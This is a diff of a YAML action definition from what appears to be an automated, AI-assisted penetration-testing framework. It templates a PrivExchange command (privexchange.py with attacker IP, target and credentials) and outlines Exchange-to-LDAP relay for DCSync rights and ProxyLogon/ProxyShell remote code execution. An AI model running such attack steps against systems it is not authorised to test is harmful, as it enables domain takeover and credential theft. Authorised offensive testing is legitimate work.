@@ -5,8 +5,7 @@ preconditions:
 - domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: python3 privexchange.py -ah {attacker_ip} {target_ip} -u '{username}'
-  -p '{password}' -d {domain}
+command_template: python3 privexchange.py -ah {attacker_ip} {target_ip} -u '{username}' -p '{password}' -d {domain}
 parser: generic_parser
 expected_effects:
 - action_completed
@@ -14,7 +13,10 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'Exchange servers have high AD privileges. PrivExchange: relay Exchange
-  auth to LDAP for DCSync rights. ProxyLogon/ProxyShell: RCE on Exchange → SYSTEM
-  on domain-joined server.'
+mechanism: "Exchange servers have high AD privileges. PrivExchange: relay Exchange auth to LDAP for DCSync rights. ProxyLogon/ProxyShell:\
+  \ RCE on Exchange \u2192 SYSTEM on domain-joined server."
 hacktricks_ref: linux-hardening/privilege-escalation/interesting-groups-linux-pe/README.md
+references:
+  ocd_mindmap_node_ids:
+  - 389c58f7d2
+  - 41cf1f49af
